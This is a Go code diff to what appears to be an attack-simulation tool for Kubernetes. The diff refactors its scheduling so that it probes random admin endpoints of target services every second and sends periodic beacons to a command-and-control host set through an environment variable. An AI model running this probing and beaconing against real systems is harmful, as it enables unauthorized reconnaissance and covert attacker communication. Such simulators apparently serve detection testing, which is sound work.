@@ -6,13 +6,12 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
+	"math/rand"
 	"net/http"
 	"os"
-
 	"sync"
 	"time"
 
-	"github.com/go-co-op/gocron/v2"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 	"k8s.io/client-go/kubernetes"
 	"k8s.io/client-go/rest"
@@ -69,11 +68,16 @@ var adminEndpoints = []string{
 
 func probeService(url string) {
 	client := &http.Client{
-		Timeout: 10 * time.Second,
+		Timeout: 2 * time.Second,
 	}
 
-	for _, endpoint := range adminEndpoints {
+	ticker := time.NewTicker(1 * time.Second)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		endpoint := adminEndpoints[rand.Intn(len(adminEndpoints))]
 		fullURL := fmt.Sprintf("http://%s%s", url, endpoint)
+
 		resp, err := client.Get(fullURL)
 		if err != nil {
 			log.Printf("evil request failed to %s: %v", fullURL, err)
@@ -149,6 +153,8 @@ func sendC2Beacon(endpoint string) {
 }
 
 func main() {
+	rand.Seed(time.Now().UnixNano())
+
 	c2Endpoint := os.Getenv("C2_ENDPOINT")
 	c2Interval := os.Getenv("C2_INTERVAL")
 	targetNS := os.Getenv("TARGET_NS")
@@ -166,25 +172,17 @@ func main() {
 		log.Fatalf("Failed to create clientset: %v", err)
 	}
 
-	s, err := gocron.NewScheduler()
-	if err != nil {
-		log.Fatalf("Failed to create scheduler: %v", err)
-	}
+	// Run k8s service check every 10 seconds
+	go func() {
+		ticker := time.NewTicker(10 * time.Second)
+		defer ticker.Stop()
 
-	// Add k8s service check job to run every 10 seconds
-	_, err = s.NewJob(
-		gocron.DurationJob(10*time.Second),
-		gocron.NewTask(
-			func() {
-				checkK8sServices(clientset, targetNS)
-			},
-		),
-	)
-	if err != nil {
-		log.Fatalf("Failed to create job: %v", err)
-	}
+		for range ticker.C {
+			checkK8sServices(clientset, targetNS)
+		}
+	}()
 
-	// Add C2 beacon job if endpoint is configured
+	// Run C2 beacon if configured
 	if c2Endpoint != "" {
 		interval := 60 * time.Second // Default 60s
 		if c2Interval != "" {
@@ -193,19 +191,15 @@ func main() {
 			}
 		}
 
-		_, err = s.NewJob(
-			gocron.DurationJob(interval),
-			gocron.NewTask(
-				func() {
-					sendC2Beacon(c2Endpoint)
-				},
-			),
-		)
-		if err != nil {
-			log.Printf("Failed to create C2 beacon job: %v", err)
-		}
+		go func() {
+			ticker := time.NewTicker(interval)
+			defer ticker.Stop()
+
+			for range ticker.C {
+				sendC2Beacon(c2Endpoint)
+			}
+		}()
 	}
 
-	s.Start()
 	select {}
 }
